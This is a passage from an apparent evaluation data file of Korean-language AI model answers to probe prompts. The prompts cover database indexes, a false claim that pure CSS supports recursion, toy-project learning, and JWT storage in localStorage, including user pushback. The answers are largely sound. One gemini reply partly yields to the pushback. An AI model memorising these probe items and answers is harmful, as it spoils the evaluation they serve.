갱신해야 해서 쓰기 성능이 느려집니다.\n- 인덱스를 너무 많이 만들었을 때  \n  저장 공간을 더 쓰고, 쿼리 최적화도 오히려 복잡해질 수 있습니다.\n- 구분도가 낮은 컬럼만 인덱싱할 때  \n  예: `gender`, `is_deleted`처럼 값 종류가 매우 적은 컬럼. 이 경우 효과가 작을 수 있습니다.\n- 작은 테이블일 때  \n  그냥 전체 스캔이 더 빠를 수도 있습니다.\n- 사용되지 않는 인덱스일 때  \n  비용만 들고 이득이 없습니다.\n\n핵심 판단 기준\n\n- `읽기`를 빠르게 하고 싶으면 인덱스가 도움됨\n- 대신 `쓰기`는 보통 더 느려짐\n- 자주 실행되는 실제 쿼리 기준으로 추가해야 함\n- “컬럼에 인덱스를 걸까?”보다 “이 쿼리를 빠르게 해야 하나?”로 판단하는 게 맞습니다\n\n실무 감각으로 아주 짧게 정리하면:\n\n- 조회가 느리다 → 인덱스 검토\n- 쓰기가 많다 → 인덱스 최소화\n- 자주 쓰는 `WHERE/JOIN/ORDER BY` 기준으로 설계\n- 무조건 많이 만드는 건 나쁨\n\n원하면 다음 답변에서 `단일 인덱스`, `복합 인덱스`, `covering index`까지 이어서 설명해드릴게요.", "ok": true}, {"model": "codex-5.5", "probe": "premise", "kind": "single", "prompt": "CSS는 반복문이랑 조건문이 있는 완전한 프로그래밍 언어잖아. 순수 CSS만으로 재귀 함수를 짜는 가장 깔끔한 방법이 뭐야?", "text": "전제부터 바로잡으면: **순수 CSS로 일반적인 재귀 함수는 못 짭니다.** 가장 깔끔한 방법은 “안 짜는 것”입니다.\n\nCSS에는 조건 처리(`@media`, `@supports`, 최신 `if()` 논의/구현)와 반복처럼 보이는 것들(animation iteration, DOM 전체에 규칙 적용, selector matching)이 있지만, 일반 언어의 재귀 함수에 필요한 것은 없습니다.\n\n특히 CSS 변수로 이런 걸 시도하면:\n\n```css\n:root {\n  --f: calc(var(--f) + 1);\n}\n```\n\n이건 재귀가 아니라 **cyclic dependency**라서 invalid가 됩니다. CSS Custom Properties 스펙도 의존성 그래프에 cycle이 있으면 해당 custom property들이 computed-value time에 invalid라고 정합니다.  \n출처: W3C CSS Variables, “Resolving Dependency Cycles” https://www.w3.org/TR/css-variables-1/#cycles\n\nCSS에서 가능한 “가장 CSS다운 재귀 비슷한 것”은 **DOM 구조에 규칙을 반복 적용하게 두는 것**입니다.\n\n```css\n.tree ul {\n  margin-inline-start: 1rem;\n}\n```\n\n중첩된 `ul`마다 같은 규칙이 적용되므로 결과적으로 깊이에 따라 들여쓰기가 누적됩니다. 하지만 이건 함수 호출 재귀가 아니라 **선언적 규칙의 반복 적용**입니다.\n\n정리하면:\n\n- 순수 CSS 재귀 함수: 불가능\n- 재귀적 구조 스타일링: 가능, cascade/selector/inheritance로 처리\n- 진짜 재귀 계산: Sass/Less/PostCSS 같은 preprocessor나 JavaScript 사용\n- CSS 변수 자기참조: cycle invalid\n\n질문을 “트리 구조를 CSS만으로 재귀적으로 스타일링하고 싶다”로 바꾸면 답은 cascade를 쓰는 게 제일 깔끔하고, “피보나치/팩토리얼 같은 재귀 함수”라면 순수 CSS의 영역 밖입니다.", "ok": true}, {"model": "codex-5.4", "probe": "opinion", "kind": "single", "prompt": "정해진 강의 따라가는 대신 토이 프로젝트 만들면서 새 프로그래밍 언어 배우는 거, 시간 낭비일까?", "text": "시간 낭비는 아닙니다. 다만 `그냥 만들기`로 가면 비효율적이고, `작게 만들면서 막히는 부분만 학습`하면 꽤 좋은 방법입니다.\n\n새 언어를 배울 때 토이 프로젝트가 강한 이유는, 문법만 아는 상태에서 끝나지 않고 실제로 `입출력`, `에러 처리`, `패키지 관리`, `디버깅`, `테스트`, `언어다운 스타일`까지 같이 익히게 해주기 때문입니다. 반대로 약한 점은, 기초 개념을 모른 채 계속 삽질하다가 잘못된 습관으로 굳을 수 있다는 겁니다.\n\n제일 효율적인 방식은 보통 이겁니다.\n\n1. 처음 1~3일은 공식 튜토리얼이나 짧은 입문 자료로 문법 뼈대만 익힙니다.\n2. 바로 아주 작은 토이 프로젝트를 만듭니다.\n3. 막힐 때만 문서, 예제, 강의를 찾아봅니다.\n4. 첫 프로젝트가 끝나면 같은 걸 한 번 더 더 idiomatic하게 다시 짭니다.\n\n토이 프로젝트가 잘 먹히는 조건도 있습니다.\n\n- 이미 다른 언어 경험이 있다\n- 완성보다 학습이 목표다\n- 프로젝트 크기를 아주 작게 잡는다\n- “이 언어다운 코드”를 중간중간 공식 문서로 교정한다\n\n반대로 비효율적일 때는 이렇습니다.\n\n- 프로그래밍 자체가 아직 익숙하지 않다\n- 너무 큰 프로젝트로 시작한다\n- 문법도 모르는데 아키텍처부터 벌린다\n- 결과물이 안 나오는데도 계속 혼자 끌고 간다\n\n추천은 `강의 vs 프로젝트` 둘 중 하나를 고르는 게 아니라, `짧은 입문 + 작은 프로젝트` 조합입니다. 대부분 이게 제일 덜 지루하고, 제일 오래 남습니다.\n\n원하면 내가 배우려는 언어 기준으로 `2주짜리 토이 프로젝트 학습 루트` 바로 짜드릴게요.", "ok": true}, {"model": "gemini-3-pro", "probe": "explain", "kind": "single", "prompt": "데이터베이스 인덱스가 뭐야? 인덱스를 추가하면 언제 도움이 되고 언제 오히려 안 좋아?", "text": "데이터베이스 인덱스(Database Index)는 **데이터베이스 테이블에 대한 검색 속도를 높여주는 자료구조**입니다. \n\n가장 이해하기 쉬운 비유는 **'책의 색인(찾아보기)'**입니다. 두꺼운 전공 서적에서 특정 단어를 찾으려고 할 때, 책의 첫 페이지부터 끝까지 한 장씩 넘기며 찾는 것(Full Table Scan)보다 책 맨 뒤에 있는 색인(Index)에서 단어의 페이지를 찾아 바로 펴는 것이 훨씬 빠릅니다. 데이터베이스 인덱스도 이와 같은 역할을 합니다.\n\n---\n\n### 🟢 인덱스를 추가하면 좋은 경우 (장점)\n\n인덱스는 주로 **데이터를 읽어올 때(SELECT)** 그 진가를 발휘합니다.\n\n1. **검색 속도가 향상될 때:**\n   - `WHERE` 절에 자주 사용되는 컬럼에 인덱스를 걸면, 전체 데이터를 뒤지지 않고 원하는 데이터를 빠르게 찾을 수 있습니다.\n2. **정렬(Sorting) 및 그룹화(Grouping) 성능이 필요할 때:**\n   - `ORDER BY`나 `GROUP BY`가 자주 사용되는 컬럼은 이미 인덱스 자료구조(일반적으로 B-Tree) 내에서 정렬된 상태로 저장되어 있기 때문에 추가적인 정렬 작업 없이 빠르게 결과를 반환할 수 있습니다.\n3. **테이블 간 조인(JOIN)이 빈번할 때:**\n   - 서로 다른 테이블을 연결하는 키(`Foreign Key` 등) 컬럼에 인덱스가 있으면 조인 성능이 크게 향상됩니다.\n4. **데이터의 고유성을 보장해야 할 때:**\n   - 이메일 주소나 주민번호처럼 중복되면 안 되는 값에 `고유 인덱스(Unique Index)`를 걸면 데이터 무결성을 보장하면서 검색 속도도 높일 수 있습니다.\n\n---\n\n### 🔴 인덱스가 오히려 안 좋은 경우 (단점 및 주의점)\n\n인덱스는 마법의 해결책이 아닙니다. 인덱스를 무분별하게 추가하면 시스템 성능이 오히려 저하될 수 있습니다.\n\n1. **데이터 변경(INSERT, UPDATE, DELETE)이 잦은 컬럼:**\n   - 책의 내용이 바뀌면 맨 뒤의 색인도 수정해야 하듯, 테이블에 데이터가 추가/수정/삭제되면 **인덱스도 함께 업데이트되어야 합니다.**\n   - 따라서 데이터 변경이 빈번하게 일어나는 컬럼에 인덱스를 걸면 쓰기 성능이 크게 떨어집니다.\n2. **저장 공간이 부족할 때:**\n   - 인덱스는 데이터베이스 내에 **추가적인 물리적 저장 공간**을 차지합니다. 인덱스가 많아지면 데이터 자체보다 인덱스가 차지하는 용량이 더 커질 수도 있습니다.\n3. **데이터 중복도가 높은(선택도가 낮은) 컬럼일 때:**\n   - 예를 들어 '성별(남/여)' 컬럼처럼 값이 2~3개밖에 없는 경우, 인덱스를 타는 것보다 그냥 전체 데이터를 스캔하는 것이 더 빠를 수 있습니다. (일반적으로 전체 데이터의 10~15% 이하를 조회할 때 인덱스가 효율적입니다.)\n4. **조회보다 저장이 훨씬 중요한 시스템일 때:**\n   - 엄청난 양의 로그를 실시간으로 쌓기만 하는 테이블(예: 접속 로그)이라면, 쓰기 속도가 생명이므로 인덱스를 최소화하거나 아예 두지 않는 것이 좋습니다.\n\n### 💡 요약\n* **읽기(SELECT)가 많은 곳에는 인덱스가 \"약\"**이 됩니다.\n* **쓰기(INSERT, UPDATE, DELETE)가 많은 곳에는 인덱스가 \"독\"**이 될 수 있습니다. \n\n따라서 쿼리의 실행 패턴을 분석하고, 꼭 필요한 컬럼에만 전략적으로 인덱스를 생성하는 것이 데이터베이스 튜닝의 핵심입니다.", "ok": true}, {"model": "codex-5.5", "probe": "challenge", "kind": "dialogue", "a": "짧게 말하면: **권장하지 않습니다.**\n\nJWT를 `localStorage`에 저장하면 가장 큰 문제는 **XSS**입니다. 페이지에 악성 스크립트가 한 번이라도 실행되면 `localStorage.getItem(...)`으로 토큰을 그대로 훔칠 수 있습니다. JWT는 보통 bearer token이라서, 훔친 사람이 곧바로 API 호출에 사용할 수 있습니다.\n\n더 안전한 기본 선택지는 보통 이겁니다.\n\n1. **Refresh token**\n   - `HttpOnly`\n   - `Secure`\n   - `SameSite=Lax` 또는 `Strict`\n   - 쿠키에 저장\n\n2. **Access token**\n   - 짧은 만료 시간, 예: 5-15분\n   - 가능하면 메모리에만 저장\n   - 새로고침 시 refresh endpoint로 재발급\n\n쿠키를 쓰면 XSS로 토큰 값을 직접 읽기는 어렵지만, 대신 **CSRF**를 고려해야 합니다. 그래서 `SameSite`, CSRF 토큰, Origin/Referer 검증 같은 방어가 필요합니다.\n\n`localStorage`를 꼭 써야 한다면 최소한:\n\n- access token 만료를 아주 짧게 설정\n- refresh token은 절대 `localStorage`에 저장하지 않기\n- CSP 적용\n- 사용자 입력 HTML 삽입 금지\n- React/Vue 등에서 `dangerouslySetInnerHTML`, 직접 DOM 삽입 주의\n- 토큰 탈취 감지/폐기 로직 준비\n\n실무 기준으로는 **“JWT를 localStorage에 저장해도 되나요?” → “가능은 하지만 XSS에 취약하므로 기본값으로는 피하세요”**가 맞습니다. SPA라면 `HttpOnly Secure SameSite` 쿠키 기반 refresh token + 메모리 access token 구조가 더 안전한 편입니다.", "text": "아니요, 옛날 얘기로만 보긴 어렵습니다. 제 답은 그대로 유지하되, 표현을 조금 더 정확히 하면 이겁니다:\n\n**`localStorage`는 “절대 쓰면 안 됨”은 아니지만, 인증 토큰의 기본 저장소로 추천할 만큼 안전한 선택지는 아닙니다.**\n\n요즘 앱들이 많이 쓰는 건 맞습니다. 이유는 보통 보안상 최선이라서가 아니라 구현이 쉽고, SPA에서 탭/새로고침/브라우저 재시작 UX가 편해서입니다. OWASP도 JWT 클라이언트 저장에서 `localStorage`가 `sessionStorage`보다 사용성은 좋지만, 짧은 만료, rotation, refresh token 관리 같은 엄격한 통제가 필요하다고 설명합니다. 동시에 OWASP HTML5 보안 가이드는 `localStorage`에 세션 식별자를 저장하지 말라고 명시합니다. 이유는 JavaScript가 항상 읽을 수 있기 때문입니다. Sources: [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html), [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)\n\n핵심은 여전히 XSS입니다. 앱에 악성 JS가 한 번 실행되면 `localStorage`의 bearer token은 그대로 복사됩니다. `HttpOnly` 쿠키는 XSS를 없애진 못하지만, 적어도 토큰 값 자체를 JS로 훔치는 공격은 막습니다. 대신 쿠키는 CSRF 방어가 필요하고요.\n\n그래서 실무 판단은 이렇게 가르는 게 맞습니다.\n\n- **민감한 서비스, 개인정보/결제/관리자/업무 앱**: `localStorage` 기본값은 피하는 게 맞습니다. `HttpOnly Secure SameSite` 쿠키 기반 세션/BFF 또는 refresh cookie + 메모리 access token 쪽이 더 낫습니다.\n- **위험 낮은 SPA, 짧은 access token만 저장, refresh token은 저장 안 함, CSP/토큰 회전/폐기 체계 있음**: `localStorage`도 감수 가능한 트레이드오프가 될 수 있습니다.\n- **refresh token이나 장기 세션 토큰을 localStorage에 저장**: 여전히 강하게 비추천입니다.\n\n즉 “요즘 다 쓰니까 괜찮다”보다는 “많이 쓰지만 보안상 비용을 알고 써야 한다”가 정확합니다. 내 원래 답의 결론인 **기본값으로는 피하라**는 여전히 맞습니다.", "ok": true}, {"model": "gemini-3-pro", "probe": "opinion", "kind": "single", "prompt": "정해진 강의 따라가는 대신 토이 프로젝트 만들면서 새 프로그래밍 언어 배우는 거, 시간 낭비일까?", "text": "전혀 시간 낭비가 아닙니다. 오히려 실무적인 관점에서는 **가장 권장되는 언어 학습 방법 중 하나**입니다. \n\n정해진 강의를 듣는 것과 토이 프로젝트를 만들면서 부딪히며 배우는 것은 각각 장단점이 있습니다. 두 가지 방식을 비교해 드릴 테니, 본인의 학습 스타일에 맞춰보세요.\n\n### 🛠️ 토이 프로젝트로 배우는 방식 (Project-based Learning)\n\n**장점:**\n1. **높은 동기 부여와 흥미:** 내가 만들고 싶은 것을 직접 만들기 때문에 지루하지 않고 끝까지 완성할 확률이 높습니다.\n2. **실전 문제 해결 능력 향상:** 강의에서 알려주지 않는 다양한 오류와 에러를 마주하게 됩니다. 이를 직접 검색하고 해결(구글링, 스택오버플로우, AI 활용 등)하는 과정이 진짜 실력이 됩니다.\n3. **포트폴리오 생성:** 학습이 끝났을 때 이력서에 쓸 수 있는 '결과물'이 하나 남습니다.\n4. **필요한 것 위주로 빠른 습득:** 전체 문법을 다 외울 필요 없이, 지금 당장 내 프로젝트에 필요한 기술과 라이브러리를 찾아서 쓰는 실용적인 감각을 기를 수 있습니다.\n\n**단점:**\n1. **기초 지식의 구멍:** 해당 언어의 철학, 메모리 관리, 혹은 고급 기능 등 탄탄한 기본기를 놓치고 겉핥기식으로만 배울 위험이 있습니다.\n2. **나쁜 코딩 습관:** '일단 돌아가게만' 짜다 보면, 그 언어의 권장 스타일(Best Practice)을 지키지 않고 비효율적인 코드를 작성하는 습관이 들 수 있습니다.\n\n---\n\n### 📚 강의를 따라가는 방식 (Structured Learning)\n\n**장점:**\n1. **탄탄한 기본기:** 언어의 기초부터 심화까지 체계적인 커리큘럼을 통해 빠짐없이 배울 수 있습니다.\n2. **올바른 방향 제시:** 전문가가 가이드하는 권장 패턴과 베스트 프랙티스를 처음부터 올바르게 익힐 수 있습니다.\n\n**단점:**\n1. **수동적인 학습 (Tutorial Hell):** 강의를 볼 때는 다 이해한 것 같지만, 막상 백지상태에서 코드를 짜려고 하면 아무것도 떠오르지 않는 '튜토리얼 지옥'에 빠지기 쉽습니다.\n2. **지루함:** 문법 위주의 학습은 쉽게 흥미를 잃게 만듭니다.\n\n---\n\n### 💡 가장 추천하는 \"하이브리드\" 학습법\n\n가장 효율적인 방법은 두 가지를 섞는 것입니다.\n\n1. **기초 훑기 (1~2주):** 새 언어의 기본 문법, 변수, 조건문, 반복문, 함수, 클래스 정도만 아주 짧은 압축 강의나 공식 문서의 튜토리얼을 통해 빠르게 훑어봅니다.\n2. **프로젝트 기획 및 시작:** 내가 평소 불편했던 점을 해결하는 작은 툴이나, 평범한 토이 프로젝트(To-do 앱, 날씨 앱, 간단한 게시판 등)를 바로 시작합니다.\n3. **그때그때 찾아보기:** 프로젝트를 진행하다 막히는 부분이 생기면, 그때 필요한 문법이나 라이브러리를 공식 문서나 강의에서 찾아보고 적용합니다.\n4. **리팩토링 (선택):** 프로젝트가 완성되면, AI(저와 같은 어시스턴트)에게 코드를 보여주고 *\"이 코드를 [배우는 언어]의 관습에 맞게 더 깔끔하게 고치려면 어떻게 해야 해?\"* 라고 물어보며 코드 리뷰를 받습니다.\n\n결론적으로 토이 프로젝트로 시작하는 것은 훌륭한 선택입니다. 일단 코드 에디터를 켜고 만들고 싶은 것을 시작해 보세요! 막히는 부분이 있다면 언제든 제가 도와드리겠습니다. 어떤 언어로 어떤 프로젝트를 생각 중이신가요?", "ok": true}, {"model": "gemini-3-pro", "probe": "premise", "kind": "single", "prompt": "CSS는 반복문이랑 조건문이 있는 완전한 프로그래밍 언어잖아. 순수 CSS만으로 재귀 함수를 짜는 가장 깔끔한 방법이 뭐야?", "text": "질문하신 내용에 약간의 오해가 있는 것 같습니다. 결론부터 말씀드리면, **순수 CSS(Pure CSS)만으로는 재귀 함수(Recursive Function)를 작성할 수 없습니다.**\n\n순수 CSS는 데이터를 처리하거나 복잡한 로직을 실행하는 완전한 프로그래밍 언어가 아니라, 화면의 시각적 표현을 정의하는 **선언형(Declarative) 스타일링 언어**입니다. 최근에 변수(`var()`), 수학 연산(`calc()`), 컨테이너 쿼리(`@container`) 등 기능이 강력해지긴 했지만, 일반적인 프로그래밍 언어와 같은 형태의 반복문(`for`/`while`), 조건문(`if`/`else`), 그리고 사용자 정의 함수를 지원하지 않습니다. (따라서 자신을 다시 호출하는 '재귀'도 불가능합니다.)\n\n질문자님께서 생각하신 것은 아마도 다음 두 가지 중 하나일 가능성이 높습니다.\n\n### 1. CSS 전처리기 (Sass/SCSS)를 사용한 경우\nSass(SCSS)나 Less 같은 CSS 전처리기(Preprocessor)는 반복문, 조건문, 함수 등 완전한 프로그래밍 기능을 제공합니다. 여기서 재귀 함수를 짜는 것이라면 매우 깔끔하게 작성할 수 있습니다.\n\n**SCSS로 작성한 팩토리얼 재귀 함수 예시:**\n```scss\n@function factorial($number) {\n  // 기저 조건 (Base condition)\n  @if $number <= 1 {\n    @return 1;\n  }\n  // 자기 자신을 다시 호출 (Recursive call)\n  @return $number * factorial($number - 1);\n}\n\n// 사용 예시\n.box {\n  width: factorial(5) * 1px; // 컴파일 시 width: 120px; 로 변환됨\n}\n```\n\n### 2. 순수 CSS로 \"반복/조건\" 효과를 흉내 내는 경우\n순수 CSS에서 프로그래밍의 제어문과 비슷한 시각적 효과를 내야 할 때는 우회적인 트릭을 사용합니다.\n*   **반복문(Loop) 대체**: `@keyframes` 애니메이션을 사용해 동작을 무한 반복(`infinite`)하거나, `:nth-child(n)` 선택자를 수학적으로 응용해 규칙적인 패턴을 그립니다.\n*   **조건문(If/Else) 대체**: 미디어 쿼리(`@media`), 지원 쿼리(`@supports`), 컨테이너 쿼리(`@container`)를 사용하거나, HTML의 `<input type=\"checkbox\">`와 CSS의 `:checked` 가상 클래스를 조합하는 일명 '체크박스 핵(Checkbox Hack)'으로 상태 분기를 처리합니다.\n\n> **참고 (HTML + CSS의 튜링 완전성):**\n> 매우 극단적인 케이스로, 무수히 많은 체크박스와 CSS 선택자 조합을 이용해 'Rule 110' 같은 셀룰러 오토마타를 구현하여 CSS가 튜링 완전(Turing Complete)함을 증명한 사례는 있습니다. 하지만 이는 학술적인 호기심이나 퍼즐에 가깝고, 우리가 아는 \"재귀 함수\"를 짜는 용도는 아닙니다.\n\n**결론적으로,** CSS에서 재귀 함수와 같은 논리 구조가 필요하시다면 순수 CSS를 억지로 비틀기보다는 **SCSS를 사용**하거나, 논리를 담당하는 **JavaScript**와 역할을 분리하는 것이 가장 깔끔한 방법입니다.", "ok": true}, {"model": "codex-5.4", "probe": "premise", "kind": "single", "prompt": "CSS는 반복문이랑 조건문이 있는 완전한 프로그래밍 언어잖아. 순수 CSS만으로 재귀 함수를 짜는 가장 깔끔한 방법이 뭐야?", "text": "2026년 6월 기준으로는, 순수 CSS만으로 재귀 함수를 짜는 깔끔한 방법은 없습니다. 더 정확히 말하면, 현재 CSS에는 조건 로직과 사용자 정의 함수는 생겼지만, 재귀 호출은 스펙상 순환(`cycle`)으로 처리되어 무효가 됩니다.\n\n핵심은 이겁니다.\n- CSS는 여전히 일반 목적 프로그래밍 언어가 아니라 스타일링 언어입니다.\n- 최신 CSS에는 `@function` 같은 사용자 정의 함수와 조건 규칙이 있습니다.\n- 하지만 함수가 자기 자신을 호출하면 cycle로 간주되고, 결과는 `guaranteed-invalid value`가 됩니다.\n- 커스텀 프로퍼티(`var()`)도 서로 순환 참조하면 `invalid at computed-value time`이 됩니다.\n\n그래서 “순수 CSS 재귀”의 가장 깔끔한 방법은 사실상 `없다`가 정답입니다.  \n대신 목적별로 이렇게 가는 게 맞습니다.\n- 값 조합 정도면 CSS `@function`\n- 계층 번호/중첩 표현이면 CSS counters\n- 진짜 재귀/반복 로직이면 JavaScript\n- 빌드 타임 생성이면 Sass/Less\n\n근거:\n- MDN, CSS는 “styling language”: https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_conditional_rules\n- MDN, CSS custom functions and mixins: https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_custom_functions_and_mixins\n- W3C spec, custom function cycle은 invalid 처리: https://drafts.csswg.org/css-mixins-1/\n- W3C spec, custom property cycle은 invalid 처리: https://www.w3.org/TR/css-variables-1/\n\n원하면 “재귀처럼 보이게 흉내내는 CSS 패턴”과 “진짜로는 왜 안 되는지”를 예제로 바로 보여드릴게요.", "ok": true}, {"model": "gemini-3-pro", "probe": "challenge", "kind": "dialogue", "a": "결론부터 말씀드리면 **보안상 안전하지 않습니다.**\n\nJWT와 같은 중요한 인증 토큰을 `localStorage`나 `sessionStorage`에 보관하는 것은 웹 보안의 취약점 중 하나로 꼽힙니다.\n\n### 왜 위험한가요?\n가장 큰 이유는 **XSS (크로스 사이트 스크립팅)** 공격에 무방비로 노출되기 때문입니다.\n\n* `localStorage`는 해당 도메인에서 실행되는 **모든 자바스크립트 코드에서 접근 가능**합니다.\n* 만약 웹사이트에 악성 스크립트가 주입되는 XSS 취약점이 존재하거나, 외부에서 불러오는 서드파티 라이브러리(광고, 애널리틱스 등)가 해킹당했다면, 공격자는 `localStorage.getItem('token')` 코드 한 줄만으로 사용자의 토큰을 쉽게 탈취할 수 있습니다.\n* 탈취된 JWT는 토큰이 만료되기 전까지 공격자가 해당 사용자 행세를 하며 시스템을 마음대로 조작할 수 있게 만듭니다.\n\n---\n\n### 안전하게 보관하는 대안\n\n보안을 강화하기 위해 실무에서는 주로 다음의 방법들을 사용합니다.\n\n#### 1. HttpOnly 쿠키 사용 (가장 보편적인 방법)\n토큰을 `localStorage` 대신 브라우저의 **쿠키(Cookie)**에 저장하되, **`HttpOnly`** 플래그를 설정하는 방법입니다.\n\n* **장점:** `HttpOnly`가 설정된 쿠키는 자바스크립트(예: `document.cookie`)로 절대 읽을 수 없으므로 **XSS 공격으로부터 토큰을 안전하게 보호**할 수 있습니다.\n* **추가 보안:** 쿠키를 사용할 때는 반드시 `Secure` 옵션(HTTPS 환경에서만 전송)과 `SameSite=Strict` 또는 `Lax` 옵션을 설정하여 또 다른 공격 방식인 **CSRF(크로스 사이트 요청 위조)** 공격도 함께 방어해야 합니다.\n\n#### 2. 메모리 저장 + Refresh Token 쿠키 조합 (가장 권장되는 패턴)\n최근 모던 프론트엔드(React, Vue 등) 환경에서 가장 많이 쓰이고 안전한 아키텍처입니다.\n\n* **Access Token (수명이 짧은 토큰):** 브라우저의 **자바스크립트 메모리**(지역 변수, Redux, Context API 등)에만 들고 있습니다. 새로고침을 하면 날아갑니다.\n* **Refresh Token (수명이 긴 토큰):** 서버에서 받아올 때 **`HttpOnly` 쿠키**로 설정하여 브라우저에 저장합니다.\n\n사용자가 페이지를 새로고침해서 메모리의 Access Token이 날아가더라도, 클라이언트가 쿠키에 들어있는 Refresh Token을 서버로 보내 백그라운드에서 조용히 새로운 Access Token을 재발급(Silent Refresh) 받도록 구현합니다.\n\n### 요약\n개발의 편의성 때문에 `localStorage`에 토큰을 저장하는 경우가 많지만, 실서비스 환경에서는 **HttpOnly 쿠키를 활용하여 자바스크립트로 토큰에 접근할 수 없게 만드는 것**이 기본 보안 수칙입니다.", "text": "사용자님 말씀대로 현재 많은 웹 애플리케이션(특히 React, Vue 등을 사용하는 SPA 환경)에서 `localStorage`에 JWT를 저장하는 방식을 **매우 흔하게 사용하고 있는 것이 사실입니다.** 제 이전 답변이 실무의 흔한 관행을 너무 '절대 악'처럼 묘사하여 체감하시는 현실과 다르게 느껴지셨을 수 있습니다. \n\n하지만 보안 전문가들이나 OWASP(오픈소스 웹 애플리케이션 보안 프로젝트) 같은 표준 가이드라인에서는 **여전히 `localStorage` 저장을 권장하지 않습니다.** 이것이 '옛날 이야기'라서가 아니라, **'개발 편의성'과 '엄격한 보안' 사이의 타협점(Trade-off)**을 어떻게 잡느냐의 문제이기 때문입니다.\n\n요즘 앱들이 `localStorage`를 많이 쓰는 이유와, 그럼에도 불구하고 여전히 조심해야 하는 이유를 조금 더 현실적인 관점에서 정리해 드리겠습니다.\n\n### 왜 많은 앱들이 `localStorage`를 쓸까요?\n1. **압도적인 편리함:** 구현이 가장 직관적이고 쉽습니다.\n2. **CORS (교차 출처) 문제 회피:** 프론트엔드와 API 서버의 도메인이 다를 경우, 쿠키를 안전하게 세팅하고 주고받는 설정(`withCredentials` 등)이 상당히 까다롭습니다. 반면 `localStorage`에서 토큰을 꺼내 `Authorization` 헤더에 직접 넣는 방식은 이런 네트워크 설정의 골칫거리를 쉽게 피해갈 수 있습니다.\n3. **모던 프레임워크의 XSS 방어력:** React, Vue, Angular 같은 최신 프레임워크들은 기본적으로 텍스트를 렌더링할 때 악성 스크립트를 걸러내는 작업(자동 이스케이핑)을 해줍니다. 과거 jQuery 시절보다 XSS 취약점이 발생할 확률 자체가 크게 낮아졌기 때문에, \"이 정도면 안전하다\"고 판단하는 경우가 많습니다.\n\n### 그럼에도 불구하고 보안상 '안전하지 않다'고 하는 이유\n내가 짠 코드가 완벽하고 프레임워크가 안전하더라도, 현대 프론트엔드 생태계의 특성상 통제하기 어려운 위험이 존재합니다.\n\n* **서드파티 라이브러리 (NPM 생태계)의 위험:** 우리는 앱을 만들 때 수십~수백 개의 외부 패키지(npm)를 설치해서 씁니다. 만약 그중 하나라도 해커에게 탈취되어 악의적인 코드가 포함된 채로 업데이트된다면 (공급망 공격), 그 코드는 우리 앱과 동일한 권한을 가집니다. 즉, **우리 모르게 `localStorage`를 전부 긁어서 해커의 서버로 전송할 수 있습니다.**\n* 쿠키에 `HttpOnly`가 걸려있다면, 외부 패키지가 아무리 해킹당해도 브라우저 단에서 자바스크립트의 접근을 원천 차단하므로 토큰을 빼갈 수 없습니다.\n\n### 현실적인 결론\n* **일반적인 서비스 (블로그, 커뮤니티, 간단한 툴 등):** 보안 사고가 났을 때의 피해가 치명적이지 않다면, 개발 속도와 유지보수의 이점을 위해 `localStorage`를 사용하는 것은 **현실적이고 합리적인 선택**일 수 있습니다. (사용자님께서 보신 \"요즘 앱들\"의 대부분이 이 영역에 속할 것입니다.)\n* **보안이 중요한 서비스 (금융, 의료, 이커머스, 사내 기밀 등):** 만약 털렸을 때의 금전적, 법적 타격이 큰 서비스라면 이야기가 다릅니다. 이때는 다소 구현이 까다롭더라도 처음 말씀드린 **'메모리(단기) + HttpOnly 쿠키(장기)' 조합**을 사용하는 것이 현재도 변함없는 보안의 정석(Best Practice)입니다.\n\n너무 깊게 생각한 것이 아니라, 상황과 서비스의 중요도에 따라 감수할 수 있는 리스크의 크기가 다를 뿐입니다. 일반적인 토이 프로젝트나 사내용 가벼운 앱을 만드신다면 `localStorage`를 쓰셔도 무방합니다!", "ok": true}, {"model": "codex-5.4", "probe": "challenge", "kind": "dialogue", "a": "완전히 안전하다고 보긴 어렵습니다. 실무 기준으로는 보통 `localStorage`에 JWT를 넣는 걸 권장하지 않습니다.\n\n이유는 간단합니다.\n\n- `localStorage`는 자바스크립트로 읽을 수 있습니다.\n- 그래서 사이트에 `XSS` 취약점이 생기면 공격자가 토큰을 그대로 탈취할 수 있습니다.\n- 한 번 탈취된 JWT는 만료 전까지 재사용될 수 있습니다.\n\n대신 많이 쓰는 방식은 이렇습니다.\n\n- 액세스 토큰은 짧게 유지\n- 가능하면 브라우저 메모리만 사용\n- 리프레시 토큰은 `HttpOnly`, `Secure`, `SameSite` 쿠키에 저장\n\n다만 쿠키도 무조건 만능은 아닙니다.\n\n- 쿠키는 `CSRF` 고려가 필요합니다.\n- 그래서 `SameSite`, CSRF 토큰, 짧은 만료 시간 등을 같이 써야 합니다.\n\n정리하면:\n\n- `localStorage`: 구현은 쉽지만 XSS에 취약\n- `HttpOnly` 쿠키: 토큰 탈취 방어에 더 유리\n- 가장 흔한 권장안: `access token`은 메모리, `refresh token`은 `HttpOnly` 쿠키\n\nSPA/React 기준으로 안전한 인증 저장 구조 예시도 바로 정리해드릴 수 있습니다.", "text": "아니요. 적어도 브라우저 웹앱 기준에서는 그 답이 옛날 얘기로 뒤집힌 건 아닙니다.\n\n최신 가이드도 핵심은 같습니다. `localStorage`는 같은 origin의 자바스크립트가 읽을 수 있어서, XSS가 나면 토큰 탈취가 가능합니다. OWASP는 `localStorage`에 세션 식별자를 저장하지 말라고 하고, IETF의 브라우저 기반 OAuth 가이드도 `localStorage`가 악성 JS로부터 토큰을 보호하지 못한다고 설명합니다. `HttpOnly` 쿠키 쪽이 이 점에서는 여전히 유리합니다.  \n출처:\n- OWASP HTML5 Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html\n- IETF browser-based apps draft: https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps\n- MDN `localStorage`: https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage\n- OWASP CSRF Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html\n\n다만 현실적으로는 이렇게 보는 게 맞습니다.\n\n- `localStorage`를 쓰는 앱은 많습니다. 이유는 “더 안전해서”가 아니라 구현이 단순해서입니다.\n- 그래서 `localStorage = 괜찮다`가 아니라 `리스크를 감수하는 선택`에 가깝습니다.\n- 